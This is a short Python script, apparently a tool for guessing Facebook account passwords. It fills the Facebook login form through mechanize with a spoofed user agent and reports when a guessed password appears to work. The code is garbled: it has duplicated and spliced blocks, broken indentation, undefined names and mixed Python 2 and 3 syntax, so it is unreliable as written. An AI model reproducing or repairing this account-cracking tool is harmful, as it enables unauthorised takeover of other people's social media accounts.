import sys, requests, os, time,random, mechanize,cookielib,
email = str(input("Username/Password facebook: "))
password = str(input("Password Bnusa: "))
login = 'https://www.facebook.com/login.php'
useragent = ('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36')



def main():
     br = mechanize.Browser()
     cj = cookielib.LWPCookieJar()
     br.set_handle_robots(False)
     br.set_handle_redirect(True)
     br.set_cookiejar(cj)
     br.set_handle_equiv(True)
     br.set_handle_referer(True)
     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
     search()
     print 'Password is wrong!'



def brute():
    sys.stdout.write(('\r[*] Trying ..... {}\n').format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
  sys.stdout.write(('\r[*] Trying ..... {}\n').format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and 'login_attempt' not in log:
        print ('\n\n[+] Password Find = {}').format(password)
        raw_input('ANY KEY to Exit....')
        sys.exit(1)    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and 'login_attempt' not in log:
        print ('\n\n[+] Password Find = {}').format(password)
        raw_input('ANY KEY to Exit....')
        sys.exit(1)

    if __name__ == '__main__':
       main()
